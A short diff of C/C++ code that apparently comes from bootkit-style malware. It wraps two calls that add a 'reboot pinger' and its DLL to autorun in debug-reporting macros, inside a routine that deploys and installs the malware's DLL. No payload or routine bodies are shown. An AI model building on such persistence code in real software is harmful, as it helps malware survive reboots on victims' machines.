@@ -353,8 +353,8 @@ bool BkDeployAndInstallDll()
 				PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("112_d"));
 
 				BKIDBG("DeployAndInstallBkDll", "add pinger to autorun...");
-				AddRebootPingToAutorun();
-				AddRebootPingDllToAutorun();
+				PP_DBGRPT_FUNCTION_CALL(AddRebootPingToAutorun());
+				PP_DBGRPT_FUNCTION_CALL(AddRebootPingDllToAutorun());
 			}
 
 			BKIDBG("DeployAndInstallBkDll", "Doing DebugReportStep2");
